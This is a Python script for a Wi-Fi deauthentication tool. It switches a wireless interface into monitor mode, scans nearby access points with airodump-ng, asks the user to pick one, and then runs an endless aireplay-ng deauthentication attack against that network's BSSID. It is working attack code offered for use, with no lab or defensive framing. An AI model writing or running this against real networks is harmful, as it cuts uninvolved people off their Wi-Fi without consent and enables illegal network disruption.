#!/bin/python
import subprocess, os, re, csv
import time, multiprocessing
from colorama import Fore

active_wireless_networks = []
wlan_pattern = re.compile("^wlan[0-9]+")

def check_for_essid(essid, lst):
    check_status = True
    if len(lst) == 0:
        return check_status
    for item in lst:
        if essid in item["ESSID"]:
            check_status = False
    return check_status

def start_info():
    print(f"""
{Fore.RED}
 __      __.__  _____.__  ________                        __  .__                  
/  \\    /  \\__|/ ____\\__| \\______ \\   ____ _____   __ ___/  |_|  |__   ___________ 
\\   \\/\\/   /  \\   __\\|  |  |    |  \\_/ __ \\\\__  \\ |  |  \\   __\  |  \\_/ __ \\_  __ \\
{Fore.RESET} \\        /|  ||  |  |  |  |    `   \  ___/ / __ \\|  |  /|  | |   Y  \\  ___/|  | \\/
  \\__/\\  / |__||__|  |__| /_______  /\\___  >____  /____/ |__| |___|  /\\___  >__|   
       \\/                         \\/     \\/     \\/                 \\/     \\/       

""")
    print(f"{Fore.GREEN}[*]{Fore.RESET} Creator : {Fore.BLUE}Dx4{Fore.RESET}")

def select_interface():
    list_interface = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())
    if len(list_interface) == 0:
        print(f"{Fore.RED}No interface detected")
        exit()
    print(f"{Fore.YELLOW}[*]{Fore.RESET} Select interface available:")
    for index, item in enumerate(list_interface):
        print(f"  {Fore.YELLOW}[{index}]{Fore.RESET} - {item}")
    selected = input(f"{Fore.YELLOW}[*]{Fore.RESET} Select: ")
    if not selected == "" and int(selected) < len(list_interface):
        return list_interface[int(selected)]
    else:
        print(f"[*] Invalid selection!")
        exit()

def change_mode(intf):
    # print(f"{Fore.BLUE}[*]{Fore.RESET} Kill conflicting procesess...")
    # change_mode = subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    print(f"{Fore.BLUE}[*]{Fore.RESET} Changing {intf} to monitor mode...")
    change_mode = subprocess.run(["sudo", "airmon-ng", "start", intf], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def fixchannel(cha):
    return "".join(char for char in cha if char.isdigit())

def set_channel(intf, ch):    
    print(f"{Fore.BLUE}[*]{Fore.RESET} Changing {intf} channel to {fixchannel(ch)}...")
    change_mode = subprocess.run(["sudo", "airmon-ng", "start", intf, fixchannel(ch)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def read_csv():
    for file_name in os.listdir():
        fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
        if ".csv" in file_name:
            with open(file_name) as csv_h:
                csv_h.seek(0)
                csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                for row in csv_reader:
                    if row["BSSID"] == "BSSID":
                        pass
                    elif row["BSSID"] == "Station MAC":
                        break
                    elif check_for_essid(row["ESSID"], active_wireless_networks):
                        active_wireless_networks.append(row)

def scan(intf):
    try:
        discover_process = multiprocessing.Process(target=discover_access_points, args=(intf,))
        discover_process.start()

        while True:
            read_csv()
            print(f"\r{Fore.BLUE}[*]{Fore.RESET} Scanning accesspoints... found {len(active_wireless_networks)} {Fore.YELLOW}Ctrl+C{Fore.RESET} to stop", end='', flush=True)
            time.sleep(1)

    except KeyboardInterrupt:
        print(f"{Fore.BLUE}[*]{Fore.RESET} Processing AP...")
        subprocess.call("clear", shell=True)
        read_csv()
        start_info()
        print("")
        print(f"{Fore.YELLOW}[*]{Fore.RESET} Select ssid below")
        print("")
        for index, item in enumerate(active_wireless_networks):
            print(f"{Fore.BLUE}[{index}]{Fore.RESET} {item['ESSID']}{item['channel']}")

        remove_all_csv()
        print("")
        selectIN = input(f"{Fore.YELLOW}[*]{Fore.RESET} Select AP: ")
        if active_wireless_networks[int(selectIN)]:
            return int(selectIN)
        else:
            exit()

def discover_access_points(intf):
    subprocess.Popen(["sudo", "airodump-ng","-w" ,"captured","--write-interval", "1","--output-format", "csv", intf], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def deauth(intf, bssid):
    subprocess.call("clear", shell=True)
    subprocess.run(["sudo", "aireplay-ng", "-0", "0", "-a", bssid, intf])
    change_mode = subprocess.run(["sudo", "airmon-ng", "stop", intf], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def remove_all_csv():
    files = os.listdir()
    for f in files:
        if f.endswith(".csv"):
            os.remove(f)

if __name__ == "__main__":
    start_info()
    if not 'SUDO_UID' in os.environ.keys():
        print(f"{Fore.RED}[*]{Fore.RESET} Try running this program with sudo.")
        exit()
    interface = select_interface()
    change_mode(interface)
    select_bssid=scan(interface)
    set_channel(interface, active_wireless_networks[select_bssid]['channel'])

    deauth(interface, active_wireless_networks[select_bssid]['BSSID'])


